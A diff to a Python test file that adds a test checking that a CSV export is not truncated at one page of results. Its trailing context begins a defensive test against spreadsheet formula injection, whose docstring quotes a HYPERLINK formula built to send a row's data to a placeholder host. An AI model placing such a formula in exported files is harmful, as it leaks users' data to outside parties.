@@ -289,6 +289,35 @@ def test_the_export_is_every_matching_row_not_one_page(make_api_account):
     assert exported == total
 
 
+def test_the_export_is_not_capped_at_one_page_of_the_maximum(make_api_account):
+    """The cap that bounds a page must not bound the file.
+
+    The export asked for a single page of MAX_PER_PAGE and stopped, so an
+    account with more rows than that downloaded a truncated file with nothing
+    in it to say anything was missing -- under a docstring promising every
+    matching row. The test above cannot catch that: its ledger is six rows,
+    so one page has always been the whole of it.
+
+    Seeded through the import endpoint rather than one POST per row, because
+    two hundred rows is two hundred round trips to a database in Mumbai.
+    """
+    client = make_api_account()
+    beyond = operations.MAX_PER_PAGE + 5
+    category = a_category(client)
+
+    response = client.post(
+        "/api/v1/import/commit", headers=client.headers,
+        json={"rows": [{"date": "2026-08-01", "amount": "10.00",
+                        "type": "Expense", "description": f"row {n}",
+                        "category_id": category}
+                       for n in range(beyond)]})
+    assert response.status_code == 201, response.get_json()
+    assert search(client, "?per_page=1")["page"]["total"] == beyond
+
+    exported = len(csv_of(client).get_data(as_text=True).splitlines()) - 1
+    assert exported == beyond
+
+
 def test_a_description_cannot_become_a_formula(make_api_account):
     """A cell beginning = + - or @ executes when the file is opened.
     '=HYPERLINK("http://x/"&A1,"click")' sends the row it sits in to
